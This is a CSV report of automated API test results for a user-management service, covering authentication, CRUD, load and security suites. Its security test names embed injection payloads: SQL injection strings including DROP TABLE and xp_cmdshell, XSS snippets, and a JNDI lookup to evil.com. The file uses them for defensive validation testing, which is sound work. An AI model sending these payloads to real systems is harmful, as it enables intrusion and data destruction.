"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"Test API with various fuzzing payloads.","94","test_input_fuzzing[fuzz_payload4]","tests","Mon Sep 29 22:48:27 UTC 2025","passed","Mon Sep 29 22:48:27 UTC 2025","TestAPIFuzzing","test_users_security","",""
"Test user creation with various invalid data scenarios.","97","test_create_user_invalid_data[test_case2]","tests","Mon Sep 29 22:47:21 UTC 2025","passed","Mon Sep 29 22:47:21 UTC 2025","TestUserCreation","test_users_crud","",""
"Test user creation with various invalid data scenarios.","95","test_create_user_invalid_data[test_case0]","tests","Mon Sep 29 22:47:20 UTC 2025","passed","Mon Sep 29 22:47:20 UTC 2025","TestUserCreation","test_users_crud","",""
"Test API access with invalid authentication.","51","test_invalid_api_key","tests","Mon Sep 29 22:47:22 UTC 2025","passed","Mon Sep 29 22:47:22 UTC 2025","TestAuthenticationSecurity","test_users_security","",""
"Test API with various fuzzing payloads.","95","test_input_fuzzing[fuzz_payload9]","tests","Mon Sep 29 22:48:27 UTC 2025","passed","Mon Sep 29 22:48:28 UTC 2025","TestAPIFuzzing","test_users_security","",""
"Test concurrent token requests.","184","test_concurrent_token_requests","tests","Mon Sep 29 22:45:48 UTC 2025","passed","Mon Sep 29 22:45:49 UTC 2025","TestRefreshTokenFlow","test_auth_login","",""
"Test protection against user enumeration attacks.","2265","test_user_enumeration_protection","tests","Mon Sep 29 22:47:24 UTC 2025","passed","Mon Sep 29 22:47:26 UTC 2025","TestAccessControlSecurity","test_users_security","",""
"Test API with various fuzzing payloads.","95","test_input_fuzzing[fuzz_payload6]","tests","Mon Sep 29 22:48:27 UTC 2025","passed","Mon Sep 29 22:48:27 UTC 2025","TestAPIFuzzing","test_users_security","",""
"Test for predictable user ID patterns.","232","test_user_id_prediction","tests","Mon Sep 29 22:47:31 UTC 2025","passed","Mon Sep 29 22:47:31 UTC 2025","TestBusinessLogicSecurity","test_users_security","",""
"Test a complete typical user management workflow.","8069","test_typical_user_workflow","tests","Mon Sep 29 22:45:54 UTC 2025","skipped","Mon Sep 29 22:46:02 UTC 2025","TestUserWorkflowScenarios","test_performance","",""
"Test user creation with various invalid data scenarios.","95","test_create_user_invalid_data[test_case5]","tests","Mon Sep 29 22:47:21 UTC 2025","passed","Mon Sep 29 22:47:21 UTC 2025","TestUserCreation","test_users_crud","",""
"Test for memory leaks during extended operation.","120196","test_memory_leak_detection","tests","Mon Sep 29 22:52:51 UTC 2025","passed","Mon Sep 29 22:54:51 UTC 2025","TestEnduranceTesting","test_performance","",""
"Test XSS injection attempts in user creation.","26","test_xss_injection_in_user_creation['; DROP TABLE users; --]","tests","Mon Sep 29 22:47:22 UTC 2025","passed","Mon Sep 29 22:47:22 UTC 2025","TestInputValidationSecurity","test_users_security","",""
"Test authentication with malformed credentials.","87","test_malformed_credentials[malformed_credentials0]","tests","Mon Sep 29 22:45:49 UTC 2025","passed","Mon Sep 29 22:45:49 UTC 2025","TestAuthenticationEdgeCases","test_auth_login","",""
"Test SQL injection attempts in user operations.","52","test_sql_injection_in_user_operations['; DROP TABLE users; --]","tests","Mon Sep 29 22:47:23 UTC 2025","passed","Mon Sep 29 22:47:23 UTC 2025","TestInputValidationSecurity","test_users_security","",""
"","25","test_list_users_returns_expected_schema[2]","tests","Mon Sep 29 22:48:30 UTC 2025","passed","Mon Sep 29 22:48:30 UTC 2025","","test_users_smoke","",""
"Test API resilience to resource exhaustion attacks.","349","test_resource_exhaustion_resilience","tests","Mon Sep 29 22:46:02 UTC 2025","failed","Mon Sep 29 22:46:03 UTC 2025","TestStressTesting","test_performance","",""
"Test that returned tokens have proper structure.","85","test_token_validation_structure","tests","Mon Sep 29 22:45:48 UTC 2025","passed","Mon Sep 29 22:45:48 UTC 2025","TestTokenExpiration","test_auth_login","",""
"Test null byte injection attempts.","93","test_null_byte_injection","tests","Mon Sep 29 22:47:24 UTC 2025","passed","Mon Sep 29 22:47:24 UTC 2025","TestInputValidationSecurity","test_users_security","",""
"Test API with various fuzzing payloads.","96","test_input_fuzzing[fuzz_payload1]","tests","Mon Sep 29 22:48:27 UTC 2025","passed","Mon Sep 29 22:48:27 UTC 2025","TestAPIFuzzing","test_users_security","",""
"Test API behavior under extreme concurrent load.","30579","test_extreme_concurrent_load","tests","Mon Sep 29 22:55:52 UTC 2025","passed","Mon Sep 29 22:56:23 UTC 2025","TestStressTesting","test_performance","",""
"Test concurrent request handling limits.","1593","test_concurrent_request_limits","tests","Mon Sep 29 22:47:28 UTC 2025","passed","Mon Sep 29 22:47:30 UTC 2025","TestRateLimitingSecurity","test_users_security","",""
"Test XSS injection attempts in user creation.","97","test_xss_injection_in_user_creation[<script>alert('xss')</script>]","tests","Mon Sep 29 22:47:22 UTC 2025","passed","Mon Sep 29 22:47:22 UTC 2025","TestInputValidationSecurity","test_users_security","",""
"Test that user creation responds within acceptable time.","86","test_create_user_response_time","tests","Mon Sep 29 22:45:50 UTC 2025","passed","Mon Sep 29 22:45:50 UTC 2025","TestUserResponseTimes","test_performance","",""
"Test XSS injection attempts in user creation.","22","test_xss_injection_in_user_creation[${jndi:ldap://evil.com/a}]","tests","Mon Sep 29 22:47:22 UTC 2025","passed","Mon Sep 29 22:47:22 UTC 2025","TestInputValidationSecurity","test_users_security","",""
"Test retrieving users with invalid or non-existent IDs.","173","test_get_user_negative_cases[NON_EXISTENT_USER-NOT_FOUND]","tests","Mon Sep 29 22:47:21 UTC 2025","passed","Mon Sep 29 22:47:21 UTC 2025","TestUserRetrieval","test_users_crud","",""
"Test XSS injection attempts in user creation.","100","test_xss_injection_in_user_creation[<img src=x onerror=alert(1)>]","tests","Mon Sep 29 22:47:22 UTC 2025","passed","Mon Sep 29 22:47:23 UTC 2025","TestInputValidationSecurity","test_users_security","",""
"Test unauthorized deletion attempts.","95","test_unauthorized_user_deletion","tests","Mon Sep 29 22:47:27 UTC 2025","passed","Mon Sep 29 22:47:27 UTC 2025","TestAccessControlSecurity","test_users_security","",""
"Test HTTP method fuzzing.","1084","test_http_method_fuzzing","tests","Mon Sep 29 22:48:28 UTC 2025","passed","Mon Sep 29 22:48:29 UTC 2025","TestAPIFuzzing","test_users_security","",""
"Test API performance under sustained load for extended period.","301894","test_sustained_load_endurance","tests","Mon Sep 29 22:47:49 UTC 2025","passed","Mon Sep 29 22:52:51 UTC 2025","TestEnduranceTesting","test_performance","",""
"Test presence of Content Security Policy headers.","29","test_csp_headers_presence","tests","Mon Sep 29 22:47:47 UTC 2025","passed","Mon Sep 29 22:47:47 UTC 2025","TestContentSecurityPolicy","test_users_security","",""
"Test JSON injection and malformed JSON handling.","558","test_json_injection_fuzzing","tests","Mon Sep 29 22:48:28 UTC 2025","passed","Mon Sep 29 22:48:28 UTC 2025","TestAPIFuzzing","test_users_security","",""
"Test performance with large payloads.","89","test_large_payload_performance","tests","Mon Sep 29 22:45:54 UTC 2025","skipped","Mon Sep 29 22:45:54 UTC 2025","TestUserMemoryAndResourceUsage","test_performance","",""
"Test XSS injection attempts in user creation.","97","test_xss_injection_in_user_creation[data:text/html,<script>alert('xss')</script>]","tests","Mon Sep 29 22:47:23 UTC 2025","passed","Mon Sep 29 22:47:23 UTC 2025","TestInputValidationSecurity","test_users_security","",""
"Test handling of expired or invalid tokens.","13","test_token_expiration_handling[eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.expired.signature]","tests","Mon Sep 29 22:45:48 UTC 2025","passed","Mon Sep 29 22:45:48 UTC 2025","TestTokenExpiration","test_auth_login","",""
"Test login with non-existent email returns error.","86","test_login_with_invalid_email_returns_error","tests","Mon Sep 29 22:45:48 UTC 2025","passed","Mon Sep 29 22:45:48 UTC 2025","","test_auth_login","",""
"Test user creation with various invalid data scenarios.","97","test_create_user_invalid_data[test_case1]","tests","Mon Sep 29 22:47:20 UTC 2025","passed","Mon Sep 29 22:47:21 UTC 2025","TestUserCreation","test_users_crud","",""
"Test refresh token flow simulation.","171","test_refresh_token_simulation","tests","Mon Sep 29 22:45:48 UTC 2025","passed","Mon Sep 29 22:45:48 UTC 2025","TestRefreshTokenFlow","test_auth_login","",""
"Test users list with different page numbers.","34","test_get_users_list_pagination[3]","tests","Mon Sep 29 22:47:21 UTC 2025","passed","Mon Sep 29 22:47:21 UTC 2025","TestUserRetrieval","test_users_crud","",""
"Test Unicode fuzzing and normalization attacks.","604","test_unicode_fuzzing","tests","Mon Sep 29 22:48:30 UTC 2025","passed","Mon Sep 29 22:48:30 UTC 2025","TestAPIFuzzing","test_users_security","",""
"Test CSRF token handling in various header formats.","7839","test_csrf_token_in_headers","tests","Mon Sep 29 22:47:39 UTC 2025","failed","Mon Sep 29 22:47:47 UTC 2025","TestCSRFProtection","test_users_security","",""
"Test successful user creation with valid data.","4708","test_create_user_with_valid_data","tests","Mon Sep 29 22:47:16 UTC 2025","passed","Mon Sep 29 22:47:20 UTC 2025","TestUserCreation","test_users_crud","",""
"Test handling of expired or invalid tokens.","14","test_token_expiration_handling[expired.token.here]","tests","Mon Sep 29 22:45:48 UTC 2025","passed","Mon Sep 29 22:45:48 UTC 2025","TestTokenExpiration","test_auth_login","",""
"Test successful user update.","105","test_update_existing_user","tests","Mon Sep 29 22:47:22 UTC 2025","passed","Mon Sep 29 22:47:22 UTC 2025","TestUserUpdate","test_users_crud","",""
"Test performance of multiple concurrent user creation requests.","192","test_concurrent_user_creation_performance","tests","Mon Sep 29 22:45:51 UTC 2025","passed","Mon Sep 29 22:45:51 UTC 2025","TestUserLoadAndConcurrency","test_performance","",""
"Test various update scenarios including edge cases.","104","test_update_user_variations[test_case1]","tests","Mon Sep 29 22:47:22 UTC 2025","failed","Mon Sep 29 22:47:22 UTC 2025","TestUserUpdate","test_users_crud","",""
"Test API availability against SLA requirements.","55180","test_availability_sla_compliance","tests","Mon Sep 29 22:45:54 UTC 2025","failed","Mon Sep 29 22:46:49 UTC 2025","TestSLABenchmarking","test_performance","",""
"Test rapid sequential requests to check for rate limiting and performance.","1735","test_rapid_sequential_requests","tests","Mon Sep 29 22:45:52 UTC 2025","passed","Mon Sep 29 22:45:54 UTC 2025","TestUserWorkflowScenarios","test_performance","",""
"Test mixed operations with realistic frequency patterns.","3153","test_mixed_operation_patterns","tests","Mon Sep 29 22:45:49 UTC 2025","passed","Mon Sep 29 22:45:52 UTC 2025","TestUserWorkflowScenarios","test_performance","",""
"Test API with various fuzzing payloads.","94","test_input_fuzzing[fuzz_payload7]","tests","Mon Sep 29 22:48:27 UTC 2025","passed","Mon Sep 29 22:48:27 UTC 2025","TestAPIFuzzing","test_users_security","",""
"Test successful login with valid email and password returns a token.","206","test_login_with_valid_credentials_returns_token","tests","Mon Sep 29 22:45:48 UTC 2025","passed","Mon Sep 29 22:45:48 UTC 2025","","test_auth_login","",""
"Test SQL injection attempts in user operations.","119","test_sql_injection_in_user_operations[1'; EXEC xp_cmdshell('dir'); --]","tests","Mon Sep 29 22:47:23 UTC 2025","passed","Mon Sep 29 22:47:23 UTC 2025","TestInputValidationSecurity","test_users_security","",""
"Test API with various fuzzing payloads.","95","test_input_fuzzing[fuzz_payload2]","tests","Mon Sep 29 22:48:27 UTC 2025","passed","Mon Sep 29 22:48:27 UTC 2025","TestAPIFuzzing","test_users_security","",""
"Test HTTP parameter pollution.","178","test_parameter_pollution","tests","Mon Sep 29 22:48:30 UTC 2025","passed","Mon Sep 29 22:48:30 UTC 2025","TestAPIFuzzing","test_users_security","",""
"Test API with various fuzzing payloads.","96","test_input_fuzzing[fuzz_payload3]","tests","Mon Sep 29 22:48:27 UTC 2025","passed","Mon Sep 29 22:48:27 UTC 2025","TestAPIFuzzing","test_users_security","",""
"Test CSP directive validation.","24","test_csp_directive_validation","tests","Mon Sep 29 22:47:47 UTC 2025","passed","Mon Sep 29 22:47:47 UTC 2025","TestContentSecurityPolicy","test_users_security","",""
"Test handling of expired or invalid tokens.","14","test_token_expiration_handling[invalid.token.format]","tests","Mon Sep 29 22:45:48 UTC 2025","passed","Mon Sep 29 22:45:48 UTC 2025","TestTokenExpiration","test_auth_login","",""
"Test authentication with malformed credentials.","288","test_malformed_credentials[malformed_credentials2]","tests","Mon Sep 29 22:45:48 UTC 2025","passed","Mon Sep 29 22:45:48 UTC 2025","TestAuthenticationEdgeCases","test_auth_login","",""
"Test XSS injection attempts in user creation.","97","test_xss_injection_in_user_creation[{{7*7}}]","tests","Mon Sep 29 22:47:22 UTC 2025","passed","Mon Sep 29 22:47:22 UTC 2025","TestInputValidationSecurity","test_users_security","",""
"Test API graceful degradation under high load.","72794","test_graceful_degradation_under_load","tests","Mon Sep 29 22:46:03 UTC 2025","passed","Mon Sep 29 22:47:16 UTC 2025","TestStressTesting","test_performance","",""
"Test API rate limiting mechanisms.","1756","test_rate_limiting_protection","tests","Mon Sep 29 22:47:27 UTC 2025","passed","Mon Sep 29 22:47:28 UTC 2025","TestRateLimitingSecurity","test_users_security","",""
"Test authentication with malformed credentials.","87","test_malformed_credentials[malformed_credentials4]","tests","Mon Sep 29 22:45:48 UTC 2025","passed","Mon Sep 29 22:45:48 UTC 2025","TestAuthenticationEdgeCases","test_auth_login","",""
"Test protection against brute force attacks.","1878","test_authentication_brute_force_protection","tests","Mon Sep 29 22:45:48 UTC 2025","passed","Mon Sep 29 22:45:50 UTC 2025","TestAuthenticationEdgeCases","test_auth_login","",""
"Test authentication with malformed credentials.","86","test_malformed_credentials[malformed_credentials5]","tests","Mon Sep 29 22:45:48 UTC 2025","passed","Mon Sep 29 22:45:48 UTC 2025","TestAuthenticationEdgeCases","test_auth_login","",""
"Test user creation with various invalid data scenarios.","96","test_create_user_invalid_data[test_case3]","tests","Mon Sep 29 22:47:21 UTC 2025","passed","Mon Sep 29 22:47:21 UTC 2025","TestUserCreation","test_users_crud","",""
"Test that user deletion responds within acceptable time.","87","test_delete_user_response_time","tests","Mon Sep 29 22:45:51 UTC 2025","passed","Mon Sep 29 22:45:51 UTC 2025","TestUserResponseTimes","test_performance","",""
"Test protection against mass assignment attacks.","95","test_mass_assignment_protection","tests","Mon Sep 29 22:47:31 UTC 2025","passed","Mon Sep 29 22:47:31 UTC 2025","TestBusinessLogicSecurity","test_users_security","",""
"Test unauthorized modification attempts.","180","test_unauthorized_user_modification","tests","Mon Sep 29 22:47:26 UTC 2025","passed","Mon Sep 29 22:47:27 UTC 2025","TestAccessControlSecurity","test_users_security","",""
"","29","test_list_resources_response_matches_schema","tests","Mon Sep 29 22:48:30 UTC 2025","passed","Mon Sep 29 22:48:30 UTC 2025","","test_users_smoke","",""
"Test that error messages don't leak sensitive information.","436","test_error_message_information_disclosure","tests","Mon Sep 29 22:47:30 UTC 2025","passed","Mon Sep 29 22:47:31 UTC 2025","TestDataLeakageSecurity","test_users_security","",""
"Test header fuzzing and injection.","15","test_header_fuzzing","tests","Mon Sep 29 22:48:29 UTC 2025","passed","Mon Sep 29 22:48:30 UTC 2025","TestAPIFuzzing","test_users_security","",""
"Test case sensitivity of credentials.","260","test_case_sensitive_credentials","tests","Mon Sep 29 22:45:50 UTC 2025","passed","Mon Sep 29 22:45:50 UTC 2025","TestAuthenticationEdgeCases","test_auth_login","",""
"Test SQL injection attempts in user operations.","120","test_sql_injection_in_user_operations['; UPDATE users SET admin=1; --]","tests","Mon Sep 29 22:47:23 UTC 2025","passed","Mon Sep 29 22:47:23 UTC 2025","TestInputValidationSecurity","test_users_security","",""
"Test that API response times meet SLA requirements.","104","test_response_time_sla_compliance","tests","Mon Sep 29 22:45:54 UTC 2025","failed","Mon Sep 29 22:45:54 UTC 2025","TestSLABenchmarking","test_performance","",""
"Test users list with different page numbers.","38","test_get_users_list_pagination[2]","tests","Mon Sep 29 22:47:21 UTC 2025","passed","Mon Sep 29 22:47:21 UTC 2025","TestUserRetrieval","test_users_crud","",""
"Test API access without authentication.","50","test_missing_api_key","tests","Mon Sep 29 22:47:22 UTC 2025","passed","Mon Sep 29 22:47:22 UTC 2025","TestAuthenticationSecurity","test_users_security","",""
"Test retrieving users with invalid or non-existent IDs.","0","test_get_user_negative_cases[INVALID_FORMAT-NOT_FOUND]","tests","Mon Sep 29 22:47:21 UTC 2025","broken","Mon Sep 29 22:47:21 UTC 2025","TestUserRetrieval","test_users_crud","",""
"Test login with empty JSON payload returns error.","88","test_login_with_empty_payload_returns_error","tests","Mon Sep 29 22:45:48 UTC 2025","passed","Mon Sep 29 22:45:48 UTC 2025","","test_auth_login","",""
"Test Unicode normalization attacks.","290","test_unicode_normalization_attacks","tests","Mon Sep 29 22:47:24 UTC 2025","passed","Mon Sep 29 22:47:24 UTC 2025","TestInputValidationSecurity","test_users_security","",""
"Test various update scenarios including edge cases.","100","test_update_user_variations[test_case0]","tests","Mon Sep 29 22:47:22 UTC 2025","passed","Mon Sep 29 22:47:22 UTC 2025","TestUserUpdate","test_users_crud","",""
"Test that user update responds within acceptable time.","90","test_update_user_response_time","tests","Mon Sep 29 22:45:50 UTC 2025","passed","Mon Sep 29 22:45:51 UTC 2025","TestUserResponseTimes","test_performance","",""
"Test security-related response headers.","25","test_response_header_security","tests","Mon Sep 29 22:47:31 UTC 2025","passed","Mon Sep 29 22:47:31 UTC 2025","TestDataLeakageSecurity","test_users_security","",""
"Test error handling scenarios under moderate load.","87","test_error_handling_under_load","tests","Mon Sep 29 22:45:54 UTC 2025","skipped","Mon Sep 29 22:45:54 UTC 2025","TestUserWorkflowScenarios","test_performance","",""
"Test authentication with malformed credentials.","86","test_malformed_credentials[malformed_credentials1]","tests","Mon Sep 29 22:45:49 UTC 2025","passed","Mon Sep 29 22:45:49 UTC 2025","TestAuthenticationEdgeCases","test_auth_login","",""
"Test SQL injection attempts in user operations.","118","test_sql_injection_in_user_operations[' UNION SELECT * FROM admin_users --]","tests","Mon Sep 29 22:47:23 UTC 2025","passed","Mon Sep 29 22:47:23 UTC 2025","TestInputValidationSecurity","test_users_security","",""
"Test user creation with various invalid data scenarios.","97","test_create_user_invalid_data[test_case4]","tests","Mon Sep 29 22:47:21 UTC 2025","passed","Mon Sep 29 22:47:21 UTC 2025","TestUserCreation","test_users_crud","",""
"Test behavior with potentially expired tokens.","25","test_expired_token_simulation","tests","Mon Sep 29 22:47:22 UTC 2025","passed","Mon Sep 29 22:47:22 UTC 2025","TestAuthenticationSecurity","test_users_security","",""
"Test protection against oversized payloads.","525","test_oversized_payload_protection","tests","Mon Sep 29 22:47:23 UTC 2025","passed","Mon Sep 29 22:47:24 UTC 2025","TestInputValidationSecurity","test_users_security","",""
"Test API with various fuzzing payloads.","95","test_input_fuzzing[fuzz_payload11]","tests","Mon Sep 29 22:48:28 UTC 2025","passed","Mon Sep 29 22:48:28 UTC 2025","TestAPIFuzzing","test_users_security","",""
"Test XSS injection attempts in user creation.","95","test_xss_injection_in_user_creation[javascript:alert('xss')]","tests","Mon Sep 29 22:47:23 UTC 2025","passed","Mon Sep 29 22:47:23 UTC 2025","TestInputValidationSecurity","test_users_security","",""
"","20","test_single_user_response_matches_schema","tests","Mon Sep 29 22:48:30 UTC 2025","passed","Mon Sep 29 22:48:30 UTC 2025","","test_users_smoke","",""
"Test API with various fuzzing payloads.","39702","test_input_fuzzing[fuzz_payload0]","tests","Mon Sep 29 22:47:47 UTC 2025","passed","Mon Sep 29 22:48:27 UTC 2025","TestAPIFuzzing","test_users_security","",""
"","26","test_list_users_returns_expected_schema[1]","tests","Mon Sep 29 22:48:30 UTC 2025","passed","Mon Sep 29 22:48:30 UTC 2025","","test_users_smoke","",""
"Test API with various fuzzing payloads.","93","test_input_fuzzing[fuzz_payload12]","tests","Mon Sep 29 22:48:28 UTC 2025","passed","Mon Sep 29 22:48:28 UTC 2025","TestAPIFuzzing","test_users_security","",""
"Test protection against resource exhaustion attacks.","578","test_resource_exhaustion_protection","tests","Mon Sep 29 22:47:31 UTC 2025","passed","Mon Sep 29 22:47:31 UTC 2025","TestBusinessLogicSecurity","test_users_security","",""
"Test API with various fuzzing payloads.","93","test_input_fuzzing[fuzz_payload5]","tests","Mon Sep 29 22:48:27 UTC 2025","passed","Mon Sep 29 22:48:27 UTC 2025","TestAPIFuzzing","test_users_security","",""
"Test API with various fuzzing payloads.","94","test_input_fuzzing[fuzz_payload10]","tests","Mon Sep 29 22:48:28 UTC 2025","passed","Mon Sep 29 22:48:28 UTC 2025","TestAPIFuzzing","test_users_security","",""
"Test user creation with additional fields.","95","test_create_user_with_extra_fields","tests","Mon Sep 29 22:47:21 UTC 2025","passed","Mon Sep 29 22:47:21 UTC 2025","TestUserCreation","test_users_crud","",""
